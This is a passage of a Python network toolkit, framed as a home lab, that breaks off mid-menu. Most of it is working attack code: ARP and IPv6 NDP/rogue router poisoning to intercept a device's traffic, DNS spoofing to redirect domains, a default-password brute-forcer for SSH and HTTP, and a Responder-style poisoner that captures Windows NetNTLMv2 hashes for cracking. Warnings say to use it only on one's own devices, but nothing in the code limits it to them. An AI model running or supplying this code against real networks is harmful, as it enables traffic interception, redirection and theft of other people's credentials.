                if IS_WIN:
                    subprocess.run(["mstsc", f"/v:{ip}"])
                else:
                    print(f"  Use an RDP client, e.g.:  xfreerdp /v:{ip}")
            elif proto == "v":
                print(f"  Open your VNC viewer to {ip}:5900")


# ----------------------------------------------------------------------
# STEP 5 - ARP man-in-the-middle LAB   (YOUR OWN network & devices ONLY)
# ----------------------------------------------------------------------
# Intercepts ONE device's traffic via ARP spoofing so you can see which
# servers it connects to (TLS SNI). This is a real interception technique
# - only run it against devices you own on a network you own. It enables
# IP forwarding so the target keeps internet, and RESTORES every change
# (both ARP tables + forwarding) when it stops.

def _fwd_alias():
    """InterfaceAlias of the interface that holds the default route."""
    ps = ("Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway} | "
          "Select-Object -First 1 -ExpandProperty InterfaceAlias")
    try:
        return subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                              capture_output=True, text=True).stdout.strip() or "Wi-Fi"
    except Exception:
        return "Wi-Fi"


def _set_forwarding(alias, state, family="IPv4"):
    """Toggle IP forwarding. Windows: per-interface via PowerShell. mac/Linux:
    global via sysctl (needs root; the intercept runs elevated)."""
    on = "1" if state == "Enabled" else "0"
    try:
        if IS_WIN:
            subprocess.run(["powershell", "-NoProfile", "-Command",
                            f"Set-NetIPInterface -InterfaceAlias '{alias}' "
                            f"-AddressFamily {family} -Forwarding {state}"],
                           capture_output=True, text=True)
        elif IS_MAC:
            key = "net.inet.ip.forwarding" if family == "IPv4" else "net.inet6.ip6.forwarding"
            subprocess.run(["sysctl", "-w", f"{key}={on}"], capture_output=True, text=True)
        else:   # Linux
            key = "net.ipv4.ip_forward" if family == "IPv4" else "net.ipv6.conf.all.forwarding"
            subprocess.run(["sysctl", "-w", f"{key}={on}"], capture_output=True, text=True)
    except Exception:
        pass


def _ipv6_gateway():
    """Link-local address of the IPv6 default router (fe80::...), or None."""
    try:
        if IS_WIN:
            ps = ("Get-NetRoute -DestinationPrefix '::/0' -ErrorAction SilentlyContinue | "
                  "Select-Object -First 1 -ExpandProperty NextHop")
            gw = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                                capture_output=True, text=True).stdout.strip()
        elif IS_MAC:
            out = subprocess.run(["route", "-n", "get", "-inet6", "default"],
                                 capture_output=True, text=True).stdout
            m = re.search(r"gateway:\s*([0-9a-fA-F:]+)", out)
            gw = m.group(1) if m else ""
        else:   # Linux
            out = subprocess.run(["ip", "-6", "route", "show", "default"],
                                 capture_output=True, text=True).stdout
            m = re.search(r"default via ([0-9a-fA-F:]+)", out)
            gw = m.group(1) if m else ""
        return gw.split("%")[0] or None     # strip any %zone id
    except Exception:
        return None


def _ipv6_neighbors(net_prefix_unused=None):
    """Reachable IPv6 neighbors as [(ip6, mac), ...] (excludes link-local fe80)."""
    res = []
    try:
        if IS_WIN:
            ps = ("Get-NetNeighbor -AddressFamily IPv6 -ErrorAction SilentlyContinue | "
                  "Where-Object {$_.State -in 'Reachable','Stale' -and "
                  "$_.IPAddress -notlike 'fe80*' -and $_.LinkLayerAddress} | "
                  "ForEach-Object {\"$($_.IPAddress)=$($_.LinkLayerAddress)\"}")
            out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                                 capture_output=True, text=True).stdout
            for line in out.splitlines():
                if "=" in line:
                    ip6, mac = line.strip().split("=", 1)
                    res.append((ip6, mac.lower().replace("-", ":")))
        elif IS_MAC:
            out = subprocess.run(["ndp", "-an"], capture_output=True, text=True).stdout
            for line in out.splitlines():
                m = re.match(r"\s*([0-9a-fA-F:]+)%?\S*\s+([0-9a-fA-F:]{17})", line)
                if m and not m.group(1).lower().startswith("fe80"):
                    res.append((m.group(1), m.group(2).lower()))
        else:   # Linux
            out = subprocess.run(["ip", "-6", "neigh"], capture_output=True, text=True).stdout
            for line in out.splitlines():
                m = re.search(r"^([0-9a-fA-F:]+)\s+dev\s+\S+\s+lladdr\s+([0-9a-fA-F:]{17})", line)
                if m and not m.group(1).lower().startswith("fe80"):
                    res.append((m.group(1), m.group(2).lower()))
    except Exception:
        pass
    return res


# ----------------------------------------------------------------------
# Fallback: identify WHO owns a destination IP when the name is hidden
# (ECH / Private Relay / VPN). Uses reverse-DNS + Team Cymru's free
# IP-to-ASN DNS service (no API key). Names may be gone, but the IP isn't.
# The TXT lookup is done with a tiny pure-stdlib UDP DNS query so it needs
# no external binary (nslookup/dig) and works identically on every OS.
# ----------------------------------------------------------------------
def _dns_txt(name):
    """Return the TXT record strings for `name` via a public resolver, or []."""
    import struct, random
    q = struct.pack(">HHHHHH", random.randint(0, 0xFFFF), 0x0100, 1, 0, 0, 0)
    for label in name.split("."):
        q += bytes([len(label)]) + label.encode()
    q += b"\x00" + struct.pack(">HH", 16, 1)   # QTYPE=TXT, QCLASS=IN
    for server in ("1.1.1.1", "8.8.8.8"):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(4)
            s.sendto(q, (server, 53))
            data, _ = s.recvfrom(4096)
            s.close()
        except Exception:
            continue
        try:
            ancount = struct.unpack(">H", data[6:8])[0]
            if not ancount:
                return []
            off = 12                                   # skip header
            while data[off]:                           # skip the question name
                off += data[off] + 1
            off += 5                                    # null byte + QTYPE + QCLASS
            out = []
            for _ in range(ancount):
                if data[off] & 0xC0 == 0xC0:           # compressed name pointer
                    off += 2
                else:
                    while data[off]:
                        off += data[off] + 1
                    off += 1
                rtype, _cls, _ttl, rdlen = struct.unpack(">HHIH", data[off:off + 10])
                off += 10
                rdata = data[off:off + rdlen]
                off += rdlen
                if rtype == 16:                        # TXT
                    i, txt = 0, ""
                    while i < len(rdata):
                        ln = rdata[i]; i += 1
                        txt += rdata[i:i + ln].decode("utf-8", "replace"); i += ln
                    out.append(txt)
            return out
        except Exception:
            return []
    return []


def _ip_lookup(ip):
    """Return (reverse_dns, 'ASnnnn Org') for an IP; either part may be ''."""
    rdns = ""
    try:
        rdns = socket.gethostbyaddr(ip)[0]
    except Exception:
        pass
    asn_org = ""
    try:
        if "." in ip:   # IPv4 only for the Cymru origin lookup (keeps it simple)
            rev = ".".join(reversed(ip.split("."))) + ".origin.asn.cymru.com"
            txts = _dns_txt(rev)
            if txts:
                asn = txts[0].split("|")[0].strip()    # 1st field = ASN
                if asn.isdigit():
                    org_txts = _dns_txt(f"AS{asn}.asn.cymru.com")
                    org = org_txts[0].split("|")[-1].strip() if org_txts else ""
                    asn_org = f"AS{asn} {org}".strip()
    except Exception:
        pass
    return rdns, asn_org


def ip_org(ip):
    rdns, asn_org = _ip_lookup(ip)
    parts = [p for p in (rdns, asn_org) if p]
    return "  |  ".join(parts) if parts else "?"


def _flows_to_seen(cap, target):
    """tshark lines 'dst<TAB>sni' -> [(sni, dst), ...], one per destination IP,
    keeping any SNI seen for that IP (so already-open flows appear with no SNI).
    Some packets carry multiple ip.dst values (comma-joined, e.g. the target's
    own IP in an embedded header) - pick the external one and drop the target."""
    flows = {}   # dst -> best sni ("" if none seen)
    for line in cap.splitlines():
        parts = line.split("\t")
        if not parts or not parts[0].strip():
            continue
        dsts = [d.strip() for d in parts[0].split(",") if d.strip()]
        dst = next((d for d in dsts if d != target), "")
        if not dst:
            continue
        sni = parts[1].strip() if len(parts) > 1 else ""
        if dst not in flows or (sni and not flows[dst]):
            flows[dst] = sni
    return [(sni, dst) for dst, sni in flows.items()]


def _report_capture(seen, target, fname):
    """Organise captured flows into two clear groups:
      1. NAMED  - connections whose SNI was visible (plaintext hostname)
      2. HIDDEN - no SNI (ECH/relay/established); identified by IP owner,
                  grouped by organisation so one owner = one block.
    Prints a readable report and saves the same structure to Downloads/<fname>."""
    named = sorted({(sni, dst) for sni, dst in seen if sni})
    hidden_ips = sorted({dst for sni, dst in seen if not sni})

    groups = {}   # "ASnnnn Org" -> [(ip, rdns), ...]
    for ip in hidden_ips:
        rdns, org = _ip_lookup(ip)
        groups.setdefault(org or "(unknown owner)", []).append((ip, rdns))

    lines = []
    lines.append(f"Intercept of {target}   {time.strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"{len(named)} named  +  {len(hidden_ips)} hidden "
                 f"across {len(groups)} owners")
    lines.append("")
    lines.append("NAMED  (plaintext SNI - exact hostname visible)")
    lines.append("-" * 60)
    if named:
        for sni, dst in named:
            lines.append(f"  {sni:<42}{dst}")
    else:
        lines.append("  (none)")
    lines.append("")
    lines.append("HIDDEN  (no SNI - identified by IP owner)")
    lines.append("-" * 60)
    if groups:
        for org in sorted(groups):
            ips = groups[org]
            lines.append(f"  {org}")
            for ip, rdns in ips:
                lines.append(f"      {ip:<16}{rdns}")
    else:
        lines.append("  (none)")

    print("\n".join("  " + ln for ln in lines))
    try:
        with open(os.path.join(HOME, "Downloads", fname), "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
    except OSError:
        pass


@contextlib.contextmanager
def arp_mitm(net, target, verbose=False):
    """ARP-poison `target` <-> gateway for the duration of the with-block, then
    restore. Shared by the ARP intercept lab and DNS spoofing.

    Yields (t_mac, g_mac) on success, or (None, err_message) on failure - the
    caller should print err_message and bail. Enables IP forwarding on entry and,
    on exit, re-advertises the REAL MACs (15x, small gaps) BEFORE disabling
    forwarding, so a device that cached the poisoned entry re-learns the truth and
    never black-holes. With verbose=True it narrates each step (for the standalone
    ARP lab); callers that print their own status leave it False."""
    from scapy.all import ARP, Ether, srp, sendp, conf
    gw = net["gateway"]
    try:
        conf.iface = conf.route.route(target)[0]     # the iface that reaches the LAN
    except Exception:
        pass

    def mac_of(ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=2, retry=2, verbose=0)
        return ans[0][1].hwsrc if ans else None

    if verbose:
        print("\nResolving MAC addresses ...")
    try:
        t_mac, g_mac = mac_of(target), mac_of(gw)
    except Exception as e:
        yield (None, f"Packet access failed: {e}\n"
                     "Raw injection needs an ADMIN shell (+ Npcap). Re-run elevated.")
        return
    if not t_mac or not g_mac:
        yield (None, f"Could not resolve MACs (target={t_mac}, gateway={g_mac}).\n"
                     "Make sure the device is awake and on this network.")
        return
    if verbose:
        print(f"  target  {target:<15} = {t_mac}")
        print(f"  gateway {gw:<15} = {g_mac}")

    alias = _fwd_alias()
    if verbose:
        print(f"\nEnabling IP forwarding on '{alias}' (keeps {target} online)...")
    _set_forwarding(alias, "Enabled")

    stop = threading.Event()

    def poison():
        # tell target WE are the gateway, and tell gateway WE are the target
        pkt_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw)
        pkt_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target)
        while not stop.is_set():
            sendp(pkt_t, verbose=0)
            sendp(pkt_g, verbose=0)
            stop.wait(2)

    th = threading.Thread(target=poison, daemon=True)
    th.start()
    try:
        yield (t_mac, g_mac)
    finally:
        if verbose:
            print("\nStopping spoof and RESTORING the network ...")
        stop.set()
        th.join(timeout=3)
        fix_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw, hwsrc=g_mac)
        fix_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target, hwsrc=t_mac)
        for _ in range(15):
            sendp(fix_t, verbose=0)
            sendp(fix_g, verbose=0)
            time.sleep(0.2)
        _set_forwarding(alias, "Disabled")   # remove forwarding only after re-learning
        if verbose:
            print("  ARP tables restored, IP forwarding disabled. Done.")


def _capture_sni(target, ipver, outfile):
    """Run a 20s tshark capture of `target`'s :443 flows (ipver 4 or 6) and report
    the server names (SNI), or the owner of the destination IP when SNI is hidden.
    Shared by the ARP and NDP intercept labs. Returns the 'seen' list."""
    tshark = find_tshark()
    iface = wifi_interface(tshark) if tshark else None
    if not (tshark and iface):
        print("  tshark/Wi-Fi interface not found - cannot show SNI.")
        return []
    src, dst = ("ip.src", "ip.dst") if ipver == 4 else ("ipv6.src", "ipv6.dst")
    # Capture ALL :443 traffic from the target (not just handshakes) so ALREADY-OPEN
    # connections show up too - their data packets still reveal the destination IP,
    # which we resolve via ip_org().
    cap = subprocess.run(
        [tshark, "-i", iface, "-a", "duration:20", "-n",
         "-Y", f"{src}=={target} && (tcp.port==443 || udp.port==443)",
         "-T", "fields", "-e", dst,
         "-e", "tls.handshake.extensions_server_name"],
        capture_output=True, text=True).stdout
    seen = _flows_to_seen(cap, target)
    _report_capture(seen, target, outfile)   # name if handshake seen, else IP->org
    return seen


def step_arp(net, target=None):
    print("\n[Intercept: ARP / IPv4]  (YOUR OWN devices only)")
    print("""Spoofs ONE device so its traffic flows through this PC, then shows
which servers it connects to (TLS SNI). Use ONLY on your own network
and your own devices. Everything is restored when it stops.""")

    if target is None:
        target = input("\nTarget device IP (e.g. your phone): ").strip()
    else:
        target = target.strip()
        print(f"\nTarget: {target}")
    if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
        print("  Not a valid IP."); return
    if not target.startswith(net["prefix"]):
        print(f"  {target} is not on your network ({net['prefix']}0/24). Aborting."); return
    if target in (net["ip"], net["gateway"]):
        print("  Refusing to target this PC or the router."); return

    try:
        import scapy.all as _s  # noqa: F401  (clear message if scapy is missing)
    except ImportError:
        print("  Needs scapy:  pip install scapy"); return

    with arp_mitm(net, target, verbose=True) as (t_mac, g_mac):
        if t_mac is None:
            for ln in g_mac.split("\n"):      # g_mac holds the error message
                print(f"  {ln}")
            return
        print("Spoofing active. Capturing the target's HTTPS server names for 20s...")
        print("(make sure the device is doing something - e.g. a video playing)\n")
        _capture_sni(target, 4, "arp-sni.txt")


# ----------------------------------------------------------------------
# STEP 6 - NDP / RA spoofing (IPv6 MITM)   YOUR OWN network & devices ONLY
# ----------------------------------------------------------------------
# IPv6 has no ARP; neighbors are found via NDP (ICMPv6 Neighbor Discovery).
# The IPv6 analog of ARP spoofing is:
#   * NA (Neighbor Advertisement) spoofing - poison a neighbor cache entry,
#     claiming the gateway's IPv6 is at OUR MAC (and vice-versa to the gw).
#   * (optional) rogue RA (Router Advertisement) - announce US as a router,
#     which can also push our DNS via the RDNSS option.
# Note: ARP spoofing does NOTHING to IPv6 traffic, and NDP spoofing does
# nothing to IPv4 - a dual-stack device needs BOTH to be fully intercepted.

def step_ndp(net, target=None):
    print("\n[Intercept: NDP / IPv6]  (YOUR OWN devices only)")
    print("""IPv6 version of the ARP lab: poisons a device's NEIGHBOR cache (and
optionally sends a rogue Router Advertisement) so its IPv6 traffic flows
through this PC. Only on your own network/devices. Restored on exit.""")

    gw6 = _ipv6_gateway()
    if not gw6:
        print("\n  No IPv6 default router on this network - there is no IPv6 to")
        print("  intercept here. (This network is IPv4-only; use option 5 / --arp.)")
        return

    try:
        from scapy.all import (Ether, IPv6, ICMPv6ND_NA, ICMPv6ND_RA,
                               ICMPv6NDOptDstLLAddr, ICMPv6NDOptSrcLLAddr,
                               ICMPv6NDOptRDNSS, getmacbyip6, sendp, conf)
    except ImportError:
        print("  Needs scapy:  pip install scapy"); return

    if target is None:
        neighbors = _ipv6_neighbors()
        if not neighbors:
            print("  No IPv6 neighbors found to target."); return
        print("\nSelect an IPv6 device to intercept (YOUR OWN devices only):")
        for idx, (ip6, mac) in enumerate(neighbors, 1):
            print(f"  {idx}) {ip6:<34} {mac}")
        choice = input("Number (blank to cancel): ").strip()
        if not choice.isdigit() or not (1 <= int(choice) <= len(neighbors)):
            print("  Cancelled."); return
        target = neighbors[int(choice) - 1][0]
    print(f"\nTarget (IPv6): {target}")
    if target == gw6:
        print("  Refusing to target the router."); return

    try:
        conf.iface = conf.route6.route(target)[0]
    except Exception:
        pass

    print("\nResolving link-layer (MAC) addresses via NDP ...")
    try:
        t_mac = getmacbyip6(target)
        g_mac = getmacbyip6(gw6)
    except Exception as e:
        print(f"  Packet access failed: {e}")
        print("  Raw injection needs an ADMIN shell (+ Npcap). Re-run elevated."); return
    if not t_mac or not g_mac:
        print(f"  Could not resolve MACs (target={t_mac}, gateway={g_mac})."); return
    my_mac = Ether().src
    print(f"  target  {target}  = {t_mac}")
    print(f"  gateway {gw6}  = {g_mac}")

    alias = _fwd_alias()
    print(f"\nEnabling IPv6 forwarding on '{alias}' (keeps {target} online)...")
    _set_forwarding(alias, "Enabled", family="IPv6")

    stop = threading.Event()

    def poison():
        # Spoofed NA: "<spoofed IP> is at MY MAC", Override flag set.
        na_to_target = (Ether(dst=t_mac) / IPv6(src=gw6, dst=target) /
                        ICMPv6ND_NA(tgt=gw6, R=1, S=0, O=1) /
                        ICMPv6NDOptDstLLAddr(lladdr=my_mac))
        na_to_gw = (Ether(dst=g_mac) / IPv6(src=target, dst=gw6) /
                    ICMPv6ND_NA(tgt=target, R=0, S=0, O=1) /
                    ICMPv6NDOptDstLLAddr(lladdr=my_mac))
        # Optional rogue RA pushing us as router + our DNS (RDNSS)
        ra = (Ether(dst=t_mac) / IPv6(dst=target) /
              ICMPv6ND_RA(routerlifetime=1800) /
              ICMPv6NDOptSrcLLAddr(lladdr=my_mac))
        while not stop.is_set():
            sendp(na_to_target, verbose=0)
            sendp(na_to_gw, verbose=0)
            sendp(ra, verbose=0)
            stop.wait(2)

    th = threading.Thread(target=poison, daemon=True)
    th.start()
    print("Spoofing active. Capturing the target's IPv6 HTTPS server names for 20s...\n")

    try:
        _capture_sni(target, 6, "ndp-sni.txt")
    finally:
        print("\nStopping spoof and RESTORING the network ...")
        stop.set()
        th.join(timeout=3)
        # Correct NAs: re-advertise the REAL MACs so caches re-learn before
        # we drop forwarding.
        fix_t = (Ether(dst=t_mac) / IPv6(src=gw6, dst=target) /
                 ICMPv6ND_NA(tgt=gw6, R=1, S=0, O=1) /
                 ICMPv6NDOptDstLLAddr(lladdr=g_mac))
        fix_g = (Ether(dst=g_mac) / IPv6(src=target, dst=gw6) /
                 ICMPv6ND_NA(tgt=target, R=0, S=0, O=1) /
                 ICMPv6NDOptDstLLAddr(lladdr=t_mac))
        for _ in range(15):
            sendp(fix_t, verbose=0)
            sendp(fix_g, verbose=0)
            time.sleep(0.2)
        _set_forwarding(alias, "Disabled", family="IPv6")
        print("  Neighbor caches restored, IPv6 forwarding disabled. Done.")


# ----------------------------------------------------------------------
# STEP 5 - INTERCEPT (unified): pick a device, auto-route to ARP (IPv4)
# or NDP (IPv6) by the target's address family. One menu entry for both.
# ----------------------------------------------------------------------
def step_intercept(net, target=None):
    if target is None:
        target = _pick_device(net, ipv6=True)
        if not target:
            return

    # Raw packet injection needs admin/root. If we're not elevated, relaunch
    # THIS intercept elevated (Windows UAC / sudo) instead of just failing.
    if not _is_admin():
        flag = "--ndp" if ":" in target else "--arp"
        print("\nThis needs admin/root for raw packet access.")
        if IS_WIN:
            print("Accept the UAC prompt - runs in an elevated window; results")
            print("save to Downloads (arp-sni.txt / ndp-sni.txt).")
        else:
            print("Enter your password for sudo when prompted.")
        _relaunch_elevated([flag, target])
        return

    # Already elevated (or non-Windows): dispatch by address family.
    if ":" in target:
        step_ndp(net, target)
    else:
        step_arp(net, target)


# ----------------------------------------------------------------------
# STEP 6 - DNS SPOOFING  (YOUR OWN devices only)
# ----------------------------------------------------------------------
# While ARP-spoofing a target, answer its DNS queries for a chosen domain
# with a forged IP (classic redirect). Only on your own network/devices.
def step_dnsspoof(net, target=None, domain=None, redirect=None):
    print("\n[Step 6] DNS SPOOF - redirect a domain  (YOUR OWN devices only)")
    if target is None:
        target = _pick_device(net, ipv6=False)
        if not target:
            return
    if not _is_admin():
        print("\nNeeds admin/root for packet injection.")
        extra = ["--dnsspoof", target]
        if domain:
            extra += [domain, redirect or net["ip"]]
        _relaunch_elevated(extra)
        return

    if not domain:
        domain = input("Domain to spoof (e.g. example.com): ").strip()
    if not domain:
        print("  No domain."); return
    if not redirect:
        redirect = input(f"Redirect it to which IP [{net['ip']}]: ").strip() or net["ip"]

    try:
        from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp, sniff
    except ImportError:
        print("  Needs scapy: pip install scapy"); return

    stats = {"seen": 0, "spoofed": 0}

    def handle(pkt):
        if pkt.haslayer(DNSQR):
            stats["seen"] += 1
            if domain.encode() in pkt[DNSQR].qname:
                reply = (Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) /
                         IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                         UDP(dport=pkt[UDP].sport, sport=53) /
                         DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                             an=DNSRR(rrname=pkt[DNSQR].qname, ttl=60, rdata=redirect)))
                sendp(reply, verbose=0)
                stats["spoofed"] += 1
                print(f"  spoofed {pkt[DNSQR].qname.decode(errors='replace')} -> {redirect}")

    # arp_mitm handles MAC resolution, forwarding, and ARP restore on exit.
    with arp_mitm(net, target) as (t_mac, g_mac):
        if t_mac is None:
            for ln in g_mac.split("\n"):      # g_mac holds the error message
                print(f"  {ln}")
            return
        print(f"\nSpoofing {domain} -> {redirect} for {target} (30s, Ctrl+C to stop)...")
        try:
            sniff(filter=f"udp port 53 and src host {target}", prn=handle,
                  timeout=30, store=0)
        except Exception as e:
            print(f"  sniff failed: {e}")
        msg = (f"plaintext DNS queries seen from {target}: {stats['seen']}  |  "
               f"spoofed: {stats['spoofed']}")
        print(f"  {msg}")
        if stats["seen"] == 0:
            print("  (0 plaintext queries = target is using encrypted DNS (DoT/DoH))")
        try:
            with open(os.path.join(HOME, "Downloads", "dnsspoof.txt"), "w",
                      encoding="utf-8") as f:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}  {domain} -> {redirect}\n{msg}\n")
        except OSError:
            pass
    print("  Restored ARP + forwarding. Done.")


# ----------------------------------------------------------------------
# STEP 7 - CREDENTIAL TEST (default/weak creds)  YOUR OWN devices ONLY
# ----------------------------------------------------------------------
DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("admin", ""),
                 ("root", "root"), ("root", "toor"), ("root", "admin"),
                 ("user", "user"), ("admin", "1234"), ("pi", "raspberry")]


def step_credtest(net):
    print("\n[Step 7] CREDENTIAL TEST - default/weak creds  (YOUR OWN devices only)")
    target = _pick_device(net, ipv6=False)
    if not target:
        return
    ports = scan_common(target)
    default = "ssh" if 22 in ports else ("http" if (80 in ports or 8080 in ports) else "ssh")
    svc = input(f"Service to test (ssh/http) [{default}]: ").strip().lower() or default
    print(f"Trying {len(DEFAULT_CREDS)} default creds against {target} ({svc}) ...")

    if svc == "ssh":
        try:
            import paramiko
        except ImportError:
            print("  needs paramiko:  pip install paramiko"); return
        import logging; logging.getLogger("paramiko").setLevel(logging.CRITICAL)
        for u, p in DEFAULT_CREDS:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                c.connect(target, username=u, password=p, timeout=5,
                          allow_agent=False, look_for_keys=False)
                print(f"  *** SUCCESS: {u}:{p or '(blank)'} ***"); c.close(); return
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                print(f"  ssh error: {e}"); return
            finally:
                try: c.close()
                except Exception: pass
        print("  no default creds worked (good)")
    elif svc == "http":
        import urllib.request, urllib.error, base64
        port = 80 if 80 in ports else 8080
        got401 = False
        for u, p in DEFAULT_CREDS:
            try:
                req = urllib.request.Request(f"http://{target}:{port}/")
                req.add_header("Authorization", "Basic " +
                               base64.b64encode(f"{u}:{p}".encode()).decode())
                r = urllib.request.urlopen(req, timeout=4)
                if r.status == 200 and got401:
                    print(f"  *** SUCCESS: {u}:{p or '(blank)'} (HTTP 200) ***"); return
            except urllib.error.HTTPError as e:
                if e.code == 401:
                    got401 = True
            except Exception:
                pass
        print("  no default creds worked" + ("" if got401 else " (no HTTP basic-auth on this port)"))


# ----------------------------------------------------------------------
# STEP 8 - RESPONDER-lite: LLMNR/NBT-NS/mDNS poisoning + NTLM capture
# ----------------------------------------------------------------------
# Answers Windows name-resolution broadcasts with our IP, then an HTTP
# listener demands NTLM auth and logs the NetNTLMv2 hash (hashcat -m 5600).
# YOUR OWN network only. Hashes are saved to Downloads/responder-hashes.txt.
def step_responder(net):
    print("\n[Step 8] RESPONDER-lite - capture Windows auth hashes  (YOUR OWN network only)")
    print("Poisons LLMNR/NBT-NS/mDNS name lookups -> our IP, then an HTTP listener")
    print("challenges for NTLM and records NetNTLMv2 hashes (crack offline with hashcat).")
    if not _is_admin():
        print("\nNeeds admin/root (bind port 80 + sniff). Relaunching elevated...")
        _relaunch_elevated(["--responder"])
        return
    try:
        from scapy.all import sniff, sendp, Ether, IP, UDP, DNS, DNSRR, LLMNRResponse, conf
    except ImportError:
        print("  needs scapy: pip install scapy"); return

    me = net["ip"]
    hashlog = os.path.join(HOME, "Downloads", "responder-hashes.txt")
    stop = threading.Event()

    # --- name-poisoning sniffer (LLMNR 5355 / mDNS 5353) -> answer with our IP ---
    def poison(pkt):
        try:
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].qdcount > 0:
                qname = pkt[DNS].qd.qname
                dport = pkt[UDP].sport
                # reply from us, claiming the queried name is at our IP
                rsp = (Ether(dst=pkt[Ether].src) / IP(dst=pkt[IP].src, src=me) /
                       UDP(sport=pkt[UDP].dport, dport=dport) /
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                           an=DNSRR(rrname=qname, type="A", ttl=30, rdata=me)))
                sendp(rsp, verbose=0)
        except Exception:
            pass

    def sniff_thread():
        try:
            sniff(filter="udp port 5355 or udp port 5353 or udp port 137",
                  prn=poison, store=0, stop_filter=lambda p: stop.is_set())
        except Exception as e:
            print(f"  sniff stopped: {e}")

    # --- minimal HTTP NTLM listener on :80 -> capture NetNTLMv2 ---
    import socketserver, http.server, base64, struct, binascii

    class NTLMHandler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            auth = self.headers.get("Authorization", "")
            if not auth.startswith("NTLM "):
                self.send_response(401)
                self.send_header("WWW-Authenticate", "NTLM")
                self.end_headers(); return
            blob = base64.b64decode(auth.split(" ", 1)[1])
            if blob[8] == 1:   # Type 1 -> send Type 2 challenge
                chal = b"\x11\x22\x33\x44\x55\x66\x77\x88"
                t2 = (b"NTLMSSP\x00\x02\x00\x00\x00\x00\x00\x00\x00\x38\x00\x00\x00"
                      b"\x05\x82\x89\x02" + chal + b"\x00" * 8 + b"\x00" * 8)
                self.send_response(401)
                self.send_header("WWW-Authenticate", "NTLM " + base64.b64encode(t2).decode())
                self.end_headers(); return
            if blob[8] == 3:   # Type 3 -> extract NetNTLMv2
                try:
                    hsh = _parse_ntlmv2(blob)
                    if hsh:
                        print(f"\n  *** CAPTURED NetNTLMv2: {hsh.split(':')[0]} ***")
                        with open(hashlog, "a", encoding="utf-8") as f:
                            f.write(hsh + "\n")
                        print(f"      saved to {hashlog} (crack: hashcat -m 5600)")
                except Exception as e:
                    print(f"  parse error: {e}")
            self.send_response(200); self.end_headers()
            self.wfile.write(b"ok")

    def _parse_ntlmv2(b):
        def field(off):
            ln = struct.unpack("<H", b[off:off + 2])[0]
            poff = struct.unpack("<I", b[off + 4:off + 8])[0]
            return b[poff:poff + ln]
        lm = field(12); nt = field(20); dom = field(28); usr = field(36)
        user = usr.decode("utf-16-le", "replace"); domain = dom.decode("utf-16-le", "replace")
        nt_proof = binascii.hexlify(nt[:16]).decode()
        blob2 = binascii.hexlify(nt[16:]).decode()
        chal = "1122334455667788"
        return f"{user}::{domain}:{chal}:{nt_proof}:{blob2}"

    th = threading.Thread(target=sniff_thread, daemon=True); th.start()
    try:
        srv = socketserver.TCPServer(("0.0.0.0", 80), NTLMHandler)
    except OSError as e:
        print(f"  can't bind :80 ({e}). Is something using port 80?"); stop.set(); return
    srv.timeout = 1
    print("\nListening 60s. Trigger a Windows name lookup (e.g. open \\\\<typo> in Explorer).")
    print("Ctrl+C to stop early.\n")
    end = time.time() + 60
    try:
        while time.time() < end:
            srv.handle_request()
    except KeyboardInterrupt:
        pass
    finally:
        stop.set(); srv.server_close()
        print("\nStopped poisoning + listener.")


# ----------------------------------------------------------------------
# STEP 9 - CVE LOOKUP (precise, by CPE)
# ----------------------------------------------------------------------
def step_cvelookup(net):
    print("\n[Step 9] CVE LOOKUP - precise, version-exact by CPE")
    kw = input("Product to search (e.g. 'openssh 8.2', 'dasannetworks h660'): ").strip()
    if not kw:
        return
    print("Searching NVD's CPE dictionary ...")
    cpes, err = nvd_cpe_search(kw)
    if err:
        print(f"  CPE search failed: {err}"); return
    if not cpes:
        print("  No CPE in NVD for that product (common for consumer/ISP routers).")
        print("  Falling back to coarse keyword lookup:")
        for ln in vuln_lookup(kw):
            print(ln)
        return
    print("\n  Matching CPEs (pick an 'o:...firmware' or 'a:...' entry - those carry CVEs):")
    for i, c in enumerate(cpes, 1):
        print(f"   {i}) {c}")
    sel = input("Number (blank to cancel): ").strip()
    if not sel.isdigit() or not (1 <= int(sel) <= len(cpes)):
        print("  Cancelled."); return
    cpe = cpes[int(sel) - 1]
    print(f"\n  Version-exact CVEs for {cpe}:")
    for ln in vuln_lookup_cpe(cpe):
        print(ln)


# ----------------------------------------------------------------------
# JSON baseline helpers (used by the auto report)
# ----------------------------------------------------------------------
def _load_json(path):
    try:
        with open(path, encoding="utf-8") as f:
            return json.load(f)
    except (OSError, ValueError):
        return None


def _save_json(path, data):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except OSError:
        pass


# ----------------------------------------------------------------------
# Menu
# ----------------------------------------------------------------------
MENU = """
  1) Discover devices on the network
  2) Port scan a device (nmap, or built-in fallback)
  3) Read traffic (DNS / connections, via tshark)
  4) Remote access helpers
  5) Intercept a device's traffic   (auto IPv4/IPv6, your own devices only)
  6) DNS spoof - redirect a domain  (your own devices only)
  7) Credential test - default/weak creds  (your own devices only)
